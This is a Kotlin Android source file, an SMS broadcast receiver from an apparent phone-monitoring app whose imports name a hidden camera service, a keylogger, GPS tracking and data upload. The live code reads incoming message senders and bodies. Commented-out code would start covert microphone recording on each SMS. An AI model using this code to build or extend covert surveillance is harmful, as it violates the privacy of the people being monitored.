package com.github.midros.istheapp.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.provider.Telephony
import com.github.midros.istheapp.data.preference.DataSharePreference.typeApp
import com.github.midros.istheapp.services.sms.SmsService
import com.github.midros.istheapp.utils.Consts.TYPE_SMS_INCOMING
import com.github.midros.istheapp.utils.ConstFun.startServiceSms
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.HiddenCameraService
import io.reactivex.disposables.CompositeDisposable
///
import io.reactivex.android.schedulers.AndroidSchedulers
import android.location.Geocoder
import android.location.Location
import android.net.Uri
import android.os.Build
import android.util.Log
import com.github.midros.istheapp.R
import com.github.midros.istheapp.data.model.ChildPhoto
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.model.Photo
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.accessibilityData.InterfaceAccessibility
import com.github.midros.istheapp.services.notificationService.InteractorNotificationService
import com.github.midros.istheapp.services.social.MonitorService
import com.github.midros.istheapp.utils.*
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.getRandomNumeric
import com.github.midros.istheapp.utils.ConstFun.showApp
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.midros.istheapp.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.midros.istheapp.utils.Consts.CHILD_GPS
import com.github.midros.istheapp.utils.Consts.CHILD_PERMISSION
import com.github.midros.istheapp.utils.Consts.CHILD_SERVICE_DATA
import com.github.midros.istheapp.utils.Consts.CHILD_SHOW_APP
import com.github.midros.istheapp.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.Consts.INTERVAL
import com.github.midros.istheapp.utils.Consts.KEY_LOGGER
import com.github.midros.istheapp.utils.Consts.KEY_TEXT
import com.github.midros.istheapp.utils.Consts.LOCATION
import com.github.midros.istheapp.utils.Consts.PARAMS
import com.github.midros.istheapp.utils.Consts.PHOTO
import com.github.midros.istheapp.utils.Consts.RECORDING
import com.github.midros.istheapp.utils.Consts.SOCIAL
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.Consts.TIMER
import com.github.midros.istheapp.utils.FileHelper.deleteFile
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.e
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.*
import javax.inject.Inject

/**
 * Created by luis rafael on 13/03/18.
 */
class SmsReceiver : BroadcastReceiver() {
    @Inject
    lateinit var interactor: InteractorNotificationService

    @Inject
    lateinit var firebase: InterfaceFirebase
    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()

    //  private fun getReference(child: String):            DatabaseReference = firebase.getDatabaseReference(child)
    //   private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        //    cancelTimer()
        deleteFile("hhh")
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""
    //  private var path: String = ""

    override fun onReceive(context: Context, intent: Intent) {

        var smsAddress = ""
        var smsBody = ""

        for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
            smsAddress = smsMessage.displayOriginatingAddress
            smsBody += smsMessage.messageBody
        }
        //
     //   val childRecording = ChildRecording(true, 600000)
        //    getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording)
//        timer = MyCountDownTimer(60 * 60 * 1000, (1 * 1000).toLong(), {
//            //         setIntervalRecord(it)
//            fileName = "uyuyuyuy"
//        }) {
//            //   private fun sendFileAudio() {
//            val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/"
//            val dateName = fileName!!.replace("$filePath/", "")
//            val uri = Uri.fromFile(File(fileName))
//
//        }

//        nameAudio = getRandomNumeric()
//        dateTime = getDateTime()
//        fileName = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/" + nameAudio + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)
//
//        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
//        timer!!.start()


    }

}

